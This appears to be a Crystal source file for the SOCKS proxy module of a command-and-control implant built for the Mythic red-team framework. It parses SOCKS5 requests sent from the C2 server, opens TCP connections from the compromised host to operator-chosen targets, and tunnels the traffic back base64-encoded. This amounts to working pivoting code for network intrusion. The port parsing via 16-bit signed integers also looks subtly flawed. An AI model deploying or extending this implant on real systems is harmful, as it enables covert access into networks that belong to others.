require "base64"
require "socket"

module Dark::Agent
  # Simple connection tracking for SOCKS connections
  struct SocksConnection
    property connection : TCPSocket
    property channel : Channel(SocksMessage)

    def initialize(@connection : TCPSocket)
      @channel = Channel(SocksMessage).new(200)
    end
  end

  # Message structure for SOCKS communication
  struct SocksMessage
    property server_id : Int32
    property data : String
    property exit : Bool

    def initialize(@server_id : Int32, @data : String, @exit : Bool = false)
    end
  end

  # Manages a single SOCKS client connection
  class SocksClient
    @target : TCPSocket?
    @active = true

    def initialize(@server_id : Int32)
      @active = true
      log_socks("#{@server_id}: New connection")
    end

    # Process a datagram from Mythic
    def handle_data(data : String) : Bool
      return false unless @active

      begin
        decoded = Base64.decode(data)

        if @target.nil?
          # First message is always a SOCKS request with IP:PORT to connect to
          log_socks("#{@server_id}: Initial connection request")
          process_handshake(decoded)
        elsif target = @target
          # For existing connections, just forward the data
          target.write(decoded)
          return true
        else
          log_error("SOCKS #{@server_id}: No target connection")
          return false
        end
      rescue ex
        log_error("SOCKS #{@server_id}: Error: #{ex.message}")
        @active = false
        notify_close
        return false
      end

      true
    end

    # Process SOCKS handshake asynchronously
    # Parses SOCKS5 protocol and establishes target connection
    private def process_handshake(data : Bytes) : Bool
      # Parse the SOCKS request to extract target host and port
      # For now, we'll use a simple parser until we fully understand Sox API
      begin
        io = IO::Memory.new(data)

        # Skip SOCKS header (VER, CMD, RSV)
        3.times { io.read_byte }
        addr_type = io.read_byte || 0

        # Extract host and port
        host = ""
        case addr_type
        when 1 # IPv4
          addr_bytes = Bytes.new(4)
          io.read_fully(addr_bytes)
          host = addr_bytes.join(".")
        when 3 # FQDN
          domain_len = io.read_byte || 0
          domain_bytes = Bytes.new(domain_len)
          io.read_fully(domain_bytes)
          host = String.new(domain_bytes)
        when 4 # IPv6
          addr_bytes = Bytes.new(16)
          io.read_fully(addr_bytes)
          # Simple IPv6 formatting
          segments = [] of String
          addr_bytes.each_slice(2) do |slice|
            hex = slice.map { |b| b.to_s(16).rjust(2, '0') }.join
            segments << hex
          end
          host = segments.join(":")
        else
          log_error("SOCKS #{@server_id}: Unsupported address type #{addr_type}")
          return false
        end

        # Read port
        port_bytes = Bytes.new(2)
        io.read_fully(port_bytes)
        port = (port_bytes[0].to_i16 << 8) | port_bytes[1].to_i16

        log_socks("#{@server_id}: Connecting to #{host}:#{port}")

        # Create direct TCP connection to target
        begin
          socket = TCPSocket.new(host, port, connect_timeout: 5.seconds)
          socket.tcp_nodelay = true
          
          @target = socket
          log_socks("#{@server_id}: TCP connection established to #{host}:#{port}")

          # Send a simple success response
          success_data = Bytes[5, 0, 0, 1, 127, 0, 0, 1, 0, 80] # Simple SOCKS5 success response
          MessageHandler.add_socks_data(@server_id, Base64.strict_encode(success_data))

          # Start reading from target
          spawn do
            begin
              read_from_target(socket)
            rescue ex
              log_error("SOCKS #{@server_id}: Error in read thread: #{ex.message}")
            end
          end
        rescue ex
          log_error("SOCKS #{@server_id}: Failed to connect to #{host}:#{port}: #{ex.message}")
          @active = false
          notify_close
          return false
        end

        return true
      rescue ex
        log_error("SOCKS #{@server_id}: Handshake failed: #{ex.message}")
        return false
      end
    end


    # Read data from target and send back to Mythic
    private def read_from_target(socket : TCPSocket)
      log_socks("#{@server_id}: Started reading from TCP connection")

      buffer = Bytes.new(4096)

      begin
        while @active && !socket.closed?
          begin
            bytes_read = socket.read(buffer)

            if bytes_read <= 0
              log_socks("#{@server_id}: TCP connection closed")
              break
            end

            # Send data directly via MessageHandler
            data_to_send = buffer[0, bytes_read]
            encoded_data = Base64.strict_encode(data_to_send)
            MessageHandler.add_socks_data(@server_id, encoded_data)

          rescue ex
            log_error("SOCKS #{@server_id}: Error reading from TCP: #{ex.message}")
            break
          end
        end
      end

      log_socks("#{@server_id}: TCP read loop ended")
      close
    end


    # Close the connection
    def close
      return unless @active

      @active = false

      # Close the TCP connection directly
      if target = @target
        target.close rescue nil
        @target = nil
      end

      notify_close
    end

    # Notify Mythic that this connection is closing
    private def notify_close
      MessageHandler.add_socks_data(@server_id, "", true)
    end

    # Send data immediately (used for handshake responses)
    private def send_data_immediate(data : Bytes)
      encoded = Base64.strict_encode(data)
      MessageHandler.add_socks_data(@server_id, encoded)
    end
  end

  # Handler for SOCKS proxy functionality
  # Simplified approach similar to Poseidon
  class SocksHandler
    # Singleton instance
    @@instance : SocksHandler?

    def self.instance : SocksHandler
      @@instance ||= new
    end

    # Track active SOCKS clients - simple map like Poseidon
    @clients : Hash(Int32, SocksClient)
    @mutex : Mutex

    private def initialize
      @clients = {} of Int32 => SocksClient
      @mutex = Mutex.new
    end

    # Process SOCKS datagram from transport
    def handle_datagram(datagram : JSON::Any) : Bool
      begin
        # Extract the essential data
        server_id = datagram["server_id"].as_i
        exit = datagram["exit"].as_bool

        # Get data string (may be nil for exit messages)
        data = ""
        if datagram["data"]? && datagram["data"].raw != nil
          data = datagram["data"].as_s
        end

        # Handle exit messages - per Mythic docs:
        # "If exit is True, then the agent should close its corresponding
        # TCP connection and clean up those resources."
        if exit
          @mutex.synchronize do
            if client = @clients[server_id]?
              client.close
              @clients.delete(server_id)
            end
          end
          return true
        end

        # Per Mythic docs:
        # "If we've never seen the server_id before, then it's likely a new connection"
        # "For existing connections... base64 decode the data field and forward those bytes"
        client = nil
        @mutex.synchronize do
          client = @clients[server_id]? || begin
            new_client = SocksClient.new(server_id)
            @clients[server_id] = new_client
            new_client
          end
        end

        # Process the data
        return client.handle_data(data) if client
        
        return false
      rescue ex
        log_error("SOCKS error: #{ex.message}")
        return false
      end
    end
    # Close all connections (for cleanup)
    def close_all
      @mutex.synchronize do
        @clients.each_value(&.close)
        @clients.clear
      end
    end

    # Get connection count for monitoring
    def connection_count : Int32
      @mutex.synchronize do
        @clients.size
      end
    end
  end
end
